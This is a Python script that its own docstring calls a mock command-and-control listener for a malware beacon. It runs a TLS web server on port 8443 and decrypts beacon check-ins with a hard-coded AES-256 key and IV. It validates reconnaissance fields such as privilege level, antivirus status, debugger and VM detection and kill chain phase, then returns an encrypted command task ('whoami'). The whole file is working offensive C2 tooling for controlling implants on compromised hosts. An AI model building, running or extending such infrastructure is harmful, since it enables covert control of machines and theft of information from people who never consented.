#!/usr/bin/env python3
"""
test_listener.py — TLS + AES-CBC mock C2 listener
Matches the beacon's crypto.c: AES-256-CBC, PKCS7 padding, static key/IV
Uses pycryptodome (pacman -S python-pycryptodome)
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sys, datetime, ssl
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ── Must match crypto.c exactly ──────────────────────────────────────
AES_KEY = bytes([
    0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8,
    0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
    0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D,
    0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B
])

AES_IV = bytes([
    0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA,
    0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD
])

LISTEN_PORT = 8443


# ── AES-256-CBC helpers ──────────────────────────────────────────────

def aes_decrypt(ciphertext):
    """Decrypt AES-256-CBC with PKCS7 padding (matches BCrypt BCRYPT_BLOCK_PADDING)"""
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
        padded = cipher.decrypt(ciphertext)
        plaintext = unpad(padded, AES.block_size)
        return plaintext
    except Exception as e:
        print(f"[!] AES decrypt error: {e}")
        return None


def aes_encrypt(plaintext):
    """Encrypt AES-256-CBC with PKCS7 padding (matches BCrypt BCRYPT_BLOCK_PADDING)"""
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
        padded = pad(plaintext, AES.block_size)
        ciphertext = cipher.encrypt(padded)
        return ciphertext
    except Exception as e:
        print(f"[!] AES encrypt error: {e}")
        return None


# ── HTTP Handler ─────────────────────────────────────────────────────

class C2Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        """Health / connectivity check"""
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
        print(f"[{self._ts()}] GET {self.path} -> 200 OK")

    def do_POST(self):
        """Beacon check-in — receives AES-encrypted JSON"""
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)

        print(f"\n[{self._ts()}] POST {self.path} ({length} bytes)")
        print(f"[*] Raw hex (first 64 bytes): {raw[:64].hex()}")

        # ── Decrypt ──────────────────────────────────────────────
        plaintext = aes_decrypt(raw)
        if plaintext is None:
            print("[!] DECRYPTION FAILED — could not decrypt payload")
            print("[!] Check that key/IV match crypto.c")
            self._respond(400, {"error": "decryption failed"})
            return

        print(f"[+] Decrypted ({len(plaintext)} bytes)")

        # ── Parse JSON ───────────────────────────────────────────
        try:
            data = json.loads(plaintext)
            print(json.dumps(data, indent=2))
        except json.JSONDecodeError as e:
            print(f"[!] JSON parse failed: {e}")
            print(f"[!] Raw plaintext: {plaintext[:200]}")
            self._respond(400, {"error": "bad json after decrypt"})
            return

        # ── Schema validation ────────────────────────────────────
        required = [
            "os", "privilege_level", "hostname", "username",
            "pid", "arch", "ip", "open_ports", "running_services",
            "domain_joined", "antivirus_running", "is_debugged", "is_vm",
            "current_kill_chain_phase"
        ]
        missing = [f for f in required if f not in data]
        if missing:
            print(f"[!] SCHEMA FAIL — missing: {missing}")
            self._respond(400, {"error": f"missing: {missing}"})
            return

        print(f"[+] SCHEMA OK — {data['hostname']}\\{data['username']} "
              f"pid={data['pid']} priv={data['privilege_level']}")
        print(f"    OS: {data.get('os_version', '?')} | "
              f"AV: {data['antivirus_running']} | "
              f"VM: {data.get('is_vm', '?')} | "
              f"Debugged: {data.get('is_debugged', '?')}")
        print(f"    Ports: {data['open_ports'][:10]}{'...' if len(data['open_ports']) > 10 else ''}")

        # ── Send encrypted task response ─────────────────────────
        task = {
            "id": "test-001",
            "command": "whoami",
            "args": None
        }
        task_json = json.dumps(task).encode("utf-8")
        encrypted_task = aes_encrypt(task_json)

        if encrypted_task is None:
            print("[!] Failed to encrypt task response")
            self._respond(500, {"error": "encrypt failed"})
            return

        print(f"[>] Sending encrypted task ({len(encrypted_task)} bytes): {task}")

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(encrypted_task)))
        self.end_headers()
        self.wfile.write(encrypted_task)

    def _respond(self, code, obj):
        """Send a plain JSON error response (unencrypted for debugging)"""
        payload = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def _ts(self):
        return datetime.datetime.now().strftime("%H:%M:%S")

    def log_message(self, format, *args):
        pass


# ── Main ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else LISTEN_PORT

    cert_file = "tools/server.crt"
    key_file = "tools/server.key"

    server = HTTPServer(("0.0.0.0", port), C2Handler)

    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_file, key_file)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        print(f"[*] Listening on 0.0.0.0:{port} (TLS)")
    except FileNotFoundError:
        print(f"[!] Cert/key not found at {cert_file} / {key_file}")
        print(f"[*] Generate with:")
        print(f"    openssl req -x509 -newkey rsa:2048 -keyout {key_file} "
              f"-out {cert_file} -days 30 -nodes -subj '/CN=192.168.1.69'")
        sys.exit(1)

    print(f"[*] AES-256-CBC key loaded ({len(AES_KEY)} bytes)")
    print(f"[*] Waiting for beacon check-in...\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down")
        server.server_close()